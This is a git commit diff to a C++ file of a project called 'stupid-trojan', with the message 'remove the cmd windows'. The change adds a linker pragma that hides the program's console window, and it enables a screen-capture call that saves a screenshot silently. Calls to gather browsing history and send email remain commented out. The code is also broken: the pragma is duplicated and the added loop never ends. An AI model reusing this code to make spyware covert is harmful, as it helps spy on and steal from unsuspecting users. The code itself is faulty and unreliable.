3a9fe29e40eb97e9603477fbf4f7522df3a44379
LiuzhouChan <llz.chann@gmail.com>
2016-12-12 17:32:39 +0800

    remove the cmd windows

--- stupid-trojan/stupid-trojan.cpp
+++ stupid-trojan/stupid-trojan.cpp
@@ -1,12 +1,24 @@
-
+#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 #include "util.h"
-
+#include<typeinfo>
+#include<stdio.h>
+#include<stdlib.h>
+#include<string>
+#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 
 int main()
 {
-	/*ScreenCapture("asd.png");
-	getHistory();
+	ScreenCapture("asd.png");
+	/*getHistory();
 	sendemail();
 	copy();*/
+	int i = 0;
+	while(1)
+	{
+		if(i==2)
+		{
+			break;
+		}
+	}
 	return 0;
 }
